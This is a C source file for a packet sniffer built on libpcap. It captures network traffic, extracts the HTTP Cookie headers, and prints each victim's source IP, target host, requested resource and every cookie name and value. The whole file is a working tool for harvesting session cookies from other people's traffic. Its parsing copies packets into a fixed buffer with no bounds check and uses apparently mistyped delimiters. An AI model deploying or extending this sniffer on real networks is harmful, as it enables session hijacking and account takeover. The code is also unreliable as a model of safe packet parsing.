#include <pcap/pcap.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <argp.h>

#include "libmypcap.h"
#include "libsniffcookies.h"

/* ---------- Global variables ---------- */

extern pcap_t *handle;
extern void (*display_data)(Host_cookies *);

/* ---------- Functions ---------- */

error_t parse_opt(int key, char *arg, struct argp_state *state)
{
	int port;
	Arguments *arguments = state->input;

	switch(key)
	{
		case 'i':
			arguments->interface = arg;
			break;
		case 'p':
			port = atoi(arg);

			if (port < 0 || port > 65535)
			{
				fprintf(stderr, "[x] Illegal port number\n");
				exit(EXIT_FAILURE);
			}

			sprintf(arguments->filter_exp, "tcp port %d", port);
			break;
		case 'C':
			display_data = display_csv_data;
			break;
		case ARGP_KEY_ARG:
		case ARGP_KEY_END:
			break;
		default:
			return ARGP_ERR_UNKNOWN;
	}

	return 0;
}

void signal_handler(int signal)
{
	switch (signal)
	{
		case SIGINT :
		case SIGTERM :
		case SIGKILL :
			if (handle == NULL)
			{
				printf("\n[*] Interrupted\n");
				exit(EXIT_SUCCESS);
			}
			else
				pcap_breakloop(handle);
			break;
	}
}

/*
 * Callback function used by pcap_loop().
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	Ether_hdr *eptr;
	Ip_hdr *ip;
	Tcp_hdr *tcp;
	void *http_payload_addr;
	char *http_cookies_addr;
	char *tok_cookie, *saveptr, *saveptr2;
	HTTP_cookie *current_cookie, *previous_cookie = NULL;

	u_short ether_type;
	u_int tcp_header_size;
	u_int http_payload_size;
	Host_cookies host_cookies = {NULL};
	struct in_addr ip_src;
	static char http_payload[DEFAULT_TCP_PAYLOAD_SIZE];

	eptr = (Ether_hdr *) packet;
	ether_type = ntohs(eptr->ether_type);

	/* If the packet doesn't use IP, we stop the function */
	if (ether_type != ETHERTYPE_IP)
		return;

	ip = (Ip_hdr *)(packet + sizeof(Ether_hdr));

	/* If the packet doesn't use TCP, we stop the function */
	if (ip->ip_type != IPPROTO_TCP)
		return;

	tcp = (Tcp_hdr *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH);
	tcp_header_size = 4 * tcp->tcp_offset;

	http_payload_addr = (void *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);
	http_payload_size = header->len - (ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);

	memcpy(http_payload, http_payload_addr, http_payload_size);

	/* If the packet doesn't use HTTP, we stop the function */
	if ((strstr(http_payload, " HTTP/")) == NULL)
		return;

	/* If the packet doesn't use HTTP cookies, we stop the function */
	if ((http_cookies_addr = strstr(http_payload, "Cookie:")) == NULL)
		return;

	http_cookies_addr += 8;
	http_cookies_addr = strtok(http_cookies_addr, "\r\t\r\t");

	tok_cookie = strtok_r(http_cookies_addr, " ;", &saveptr);

	/* While there are cookies */
	while (tok_cookie != NULL)
	{
		current_cookie = (HTTP_cookie *) malloc(sizeof(HTTP_cookie));

		if (current_cookie == NULL)
		{
			fprintf(stderr, "[x] Out of memory\n");
			pcap_close(handle);
			exit(EXIT_FAILURE);
		}

		current_cookie->id = strtok_r(tok_cookie, "=", &saveptr2);
		current_cookie->val = strtok_r(NULL, "=", &saveptr2);
		current_cookie->next = NULL;

		if (previous_cookie == NULL)
			host_cookies.cookies = current_cookie;
		else
			previous_cookie->next = current_cookie;

		previous_cookie = current_cookie;
		tok_cookie = strtok_r(NULL, " ;", &saveptr);
	}

	ip_src.s_addr = ip->ip_src_addr;
	host_cookies.ip_src = inet_ntoa(ip_src);

	host_cookies.host_dst = strstr(http_payload, "Host:");
	host_cookies.host_dst += 6;
	host_cookies.host_dst = strtok(host_cookies.host_dst, "\r\t\r\t");

	host_cookies.request_type = strtok_r(http_payload, " ", &saveptr);
	host_cookies.resource = strtok_r(NULL, " ", &saveptr);

	if (host_cookies.cookies != NULL)
		display_data(&host_cookies);
}

/*
 * Display cookies as raw data.
 */
void display_raw_data(Host_cookies *host_cookies)
{
	HTTP_cookie *current_cookie = host_cookies->cookies, *previous_cookie;

	printf("Host : %s\n", host_cookies->host_dst);
	printf("IP source : %s\n", host_cookies->ip_src);
	printf("Resource : %s\n", host_cookies->resource);
	printf("Request type : %s\n\n", host_cookies->request_type);

	while (current_cookie != NULL)
	{
		printf("%s = %s\n", current_cookie->id, current_cookie->val);
		previous_cookie = current_cookie;
		current_cookie = current_cookie->next;
		free(previous_cookie);
	}

	printf("--------------------------------------\n");
}

/*
 * Display cookies as CSV data.
 */
void display_csv_data(Host_cookies *host_cookies)
{
	HTTP_cookie *current_cookie = host_cookies->cookies, *previous_cookie;

	printf("%s;%s;%s;%s", host_cookies->host_dst, host_cookies->ip_src, host_cookies->resource, host_cookies->request_type);

	while (current_cookie != NULL)
	{
		printf(";%s;%s", current_cookie->id, current_cookie->val);
		previous_cookie = current_cookie;
		current_cookie = current_cookie->next;
		free(previous_cookie);
	}

	printf("\n");
}
